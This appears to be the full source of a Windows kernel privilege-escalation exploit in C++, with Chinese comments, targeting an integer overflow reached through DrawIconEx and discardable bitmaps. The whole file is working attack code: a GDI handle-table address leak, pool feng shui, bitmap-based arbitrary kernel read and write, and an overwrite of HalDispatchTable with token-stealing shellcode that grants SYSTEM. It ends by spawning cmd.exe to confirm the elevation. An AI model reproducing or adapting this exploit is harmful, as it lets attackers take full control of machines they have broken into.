/*
* exploit.cpp:
*	[+] 利用此整数溢出漏洞
*/

#include "common.h"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define NtCurrentProcess() (HANDLE)-1
#define NtCurrentThread()  (HANDLE)-1
HBITMAP hBitmap[0x1000] = {};
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
DWORD32 pManagerPrvScan0 = NULL;
DWORD32 pWorkerPrvScan0 = NULL;
typedef
NTSTATUS
(WINAPI *pfNtAllocateVirtualMemory) (
	HANDLE       ProcessHandle,
	PVOID       *BaseAddress,
	ULONG_PTR    ZeroBits,
	PSIZE_T      RegionSize,
	ULONG        AllocationType,
	ULONG        Protect
	);

pfNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

/*
* getCurrentPEB:
*	[+] 使用TEB找到当前的PEB地址
*/
DWORD32 getCurrentPEB()
{
	DWORD32 pebAddr;
	_asm
	{
		mov eax, fs:[0x30]
		mov pebAddr, eax
	}
	return pebAddr;
}

DWORD32 getGDIAddrByHandle(HANDLE handle)
{
	DWORD32 pebAddr = getCurrentPEB();	// 获取当前进程PEB地址

	//std::cout << "[+] peb Addr at: " << std::hex << pebAddr << std::endl;

	DWORD32 GdiSharedHandleTable = *(DWORD32*)(pebAddr + 0x94);	// 获取GDISharedHandleTable的地址
	
	std::cout << "[+] GdiSharedHandleTable Addr at: " << std::hex << GdiSharedHandleTable << std::endl;

	
	GDICELL_32 leakCeil = *((PGDICELL_32)((PUCHAR)GdiSharedHandleTable + LOWORD(handle) * sizeof(GDICELL_32)));	// 获取其地址

	//std::cout << "[+] Debug 1" << std::endl;

	return (DWORD32)leakCeil.pKernelAddress;
}

VOID prepareFengShui()
{

	for (int i = 0; i < 0x1000; i++)
	{
		hBitmap[i] = CreateBitmap(0x744, 2, 1, 8, NULL);
	}
	
	
	DWORD32 addr = getGDIAddrByHandle(hBitmap[100]);
	std::cout << "[+] Bitmap addr at: " << std::hex << addr << std::endl;

	// 分配之后再释放
	TCHAR st[0x32];
	for (int s = 0; s < 2000; s++) {
		WNDCLASSEX Class2 = { 0 };
		wsprintf(st, "Class%d", s);
		Class2.lpfnWndProc = DefWindowProc;
		Class2.lpszClassName = st;
		Class2.lpszMenuName = "TEST";
		Class2.cbSize = sizeof(WNDCLASSEX);
		if (!RegisterClassEx(&Class2)) {
			break;
		}
	}

}

DWORD32 leakWorkerPvScan0()
{
	char *buf = (char *)malloc(0x100);
	hWorkerBitmap = CreateBitmap(0x101, 2, 1, 8, buf);
	if (hWorkerBitmap == NULL) std::cout << "[+] faield!!!" << std::endl;
	return getGDIAddrByHandle(hWorkerBitmap)+0x30;
}


VOID exploit()
{
	pWorkerPrvScan0 = leakWorkerPvScan0();
	std::cout << "[+] worker handle is: " << std::hex << hWorkerBitmap << std::endl;
	std::cout << "[+] pworkerprvScan0 addr is: " << std::hex << pWorkerPrvScan0 << std::endl;
	prepareFengShui();
	triggerTheVul();
	
}
/*
* getKernelBase:
*	[+] 获取 ntoskrnl.exe 的基地址
*/
LPVOID getKernelBase()
{
	LPVOID  lpImageBase[1024];
	DWORD cbNeeded;
	TCHAR baseName[1024];
	// 使用EnumDeviceDriver来获取内核基地址
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &cbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		// 获取基地址的名字
		GetDeviceDriverBaseNameA(lpImageBase[i], baseName, 48);

		if (!strcmp(baseName, "ntkrnlpa.exe"))
		{
			std::cout << "[+] basename: " << baseName << std::endl;
			std::cout << "[+] ntoskrnl.exe at kernel space: " << lpImageBase[i] << std::endl;
			return lpImageBase[i];
		}

	}

	return NULL;
}
/*
* getHalDispatchOffset4:
*	[+] 获取HalDispatchtable第二项的地址, 以执行shellcode
*/
DWORD32 getHalDispatchOffset4()
{
	// 获取xxx在kernel space 的基地址
	PVOID pKernelBase = getKernelBase();

	// 获取xxx在user space 的基地址
	HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");

	// 获取HalDispatchTable 在user space的地址
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	// 算出其在 kernel space的偏移
	return (DWORD32)pKernelBase + ((DWORD32)pUserSpaceAddr - (DWORD32)hUserSpaceBase) + 0x4;
}


typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);



VOID readOOB(DWORD32 whereRead, PVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(hManagerBitmap, len, &whereRead);	// 改变任意地址
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD32 whereWrite, PVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// 写
}
/*
* triggerVul:
*	[+] 触发此漏洞
*/
VOID triggerTheVul()
{
	// 利用0x6的读写能力
	BYTE* bits = (BYTE*)malloc(0x2000);
	BYTE* corruptBuf = (BYTE*)malloc(0xedc + 0x4);
	HDC hDc; // edi@1
	HDC hdcCall; // esi@1
	HICON hIcon; // ebx@1
	HBITMAP hBitMap; // eax@1
	HBRUSH i; // esi@1
			  /**/
	PVOID               MemAddr = (PVOID)1;
	SIZE_T              MemSize = 0x1000;


	hDc = GetWindowDC(0);
	hdcCall = CreateCompatibleDC(hDc);
	hIcon = LoadIconW(0, (LPCWSTR)0x7F02);
	// ulSizeTotal = ((cxInput*0x20) >> 3) * cyInput + 0x44
	// allocSize = ulSizeTotal + 0x40 + 0x8
	//hBitMap = CreateDiscardableBitmap(hdcCall, 0x01d41d41, 0x23);	// 这个地方分配的大小得改为0x18

																	/*
																	HBITMAP CreateDiscardableBitmap(
																	HDC hdc,
																	int cx,
																	int cy
																	);
																	*/
	hBitMap = CreateDiscardableBitmap(hdcCall, 0x12AE8F, 0x36D);
	if (hdcCall == NULL || hIcon == NULL || hBitMap == NULL)
	{
		std::cout << "[+] null failed" << std::endl;
	}

	i = CreatePatternBrush(hBitMap);
//	__debugbreak();
	DrawIconEx(hDc, 0, 0x11223344, hIcon, 0x5566, 0x7788, 0x12345678u, i, 8u);
	int corruptIndex = 0;
	for (int i = 0; i < 0x1000; i++)
	{
		if (GetBitmapBits(hBitmap[i], 0x1000, bits) != 0xe88)
		{
			std::cout << "[+] Bitmap get size: " << GetBitmapBits(hBitmap[i], 0x2000, bits) << std::endl;	// e88
			corruptIndex = i;

		}
	}

	CopyMemory(corruptBuf, bits, 0xedc + 0x4);	// 备份完毕
	hManagerBitmap = (HBITMAP)(*(PDWORD)(corruptBuf + 0xeac));
	*(DWORD32*)(corruptBuf + 0xedc) = pWorkerPrvScan0;
	// 利用bit修改pvScan0
	// 修改edc
	SetBitmapBits(hBitmap[corruptIndex], 0xedc + 0x4, corruptBuf);	// 修改了值

																	// 修复堆头

																	// 计算堆头地址
	DWORD32 fixPoolAddr = getGDIAddrByHandle(hManagerBitmap) - 0x1000;
	DWORD32 fixHandle = 0;
	readOOB(fixPoolAddr + 0x14, &fixHandle, sizeof(DWORD32));
	// 需要修复: -0x8, -0x4, -0x0, -0x4, -0x8

	// 保存的数据
	DWORD32 remData = (DWORD32)(corruptBuf + 0xedc - 0x30);
	writeOOB(fixPoolAddr - 0x8, (PVOID)(*(PDWORD)(remData - 0x8)), sizeof(DWORD32));
	writeOOB(fixPoolAddr - 0x4, (PVOID)(*(PDWORD)(remData - 0x4)), sizeof(DWORD32));
	writeOOB(fixPoolAddr - 0x0, (PVOID)fixHandle, sizeof(DWORD32));
	writeOOB(fixPoolAddr + 0x4, (PVOID)(*(PDWORD)(remData + 0x4)), sizeof(DWORD32));
	writeOOB(fixPoolAddr + 0x8, (PVOID)(*(PDWORD)(remData + 0x8)), sizeof(DWORD32));


}

VOID shellCode()
{
	__asm
	{
		pushad
		mov eax, fs:[124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0b8h]
					 sub eax, 0b8h
					 cmp[eax + 0b4h], edx
					 jnz find_sys_pid

					 mov edx, [eax + 0f8h]
					 mov[ecx + 0f8h], edx
					 popad
	}
}
VOID runShellCode()
{
	DWORD interVal = 0;
	// find haldispatchtable+0x4 and replace it
	DWORD32 halHooked = getHalDispatchOffset4();
	std::cout << "[+] haldispatchtable offset 4 at: " << std::hex << halHooked << std::endl;
	// 获取基地址

	// 执行shellcode
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	writeOOB(halHooked, (PVOID)&shellCode, sizeof(DWORD32));
	NtQueryIntervalProfile(0x1234, &interVal);
}
/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}